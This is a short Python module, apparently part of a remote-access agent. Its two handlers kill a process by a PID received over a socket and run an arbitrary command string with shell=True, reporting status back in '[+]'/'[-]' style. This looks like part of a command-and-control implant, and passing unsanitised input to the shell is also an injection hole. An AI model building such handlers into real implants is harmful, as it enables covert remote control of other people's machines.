import subprocess

from agent.core.protocol import reliable_send


def kill_process(sock, platform, target):
    try:
        pid = target.strip()
        cmd = platform.kill_process_cmd(pid)
        subprocess.run(cmd, shell=True, capture_output=True)
        reliable_send(sock, f'[+] Killed PID: {pid}')
    except Exception as e:
        reliable_send(sock, f'[-] Error killing process: {str(e)}')


def sendall_command(sock, command):
    try:
        subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        reliable_send(sock, f'[+] Command sent to all: {command}')
    except Exception as e:
        reliable_send(sock, f'[-] Error running sendall: {str(e)}')
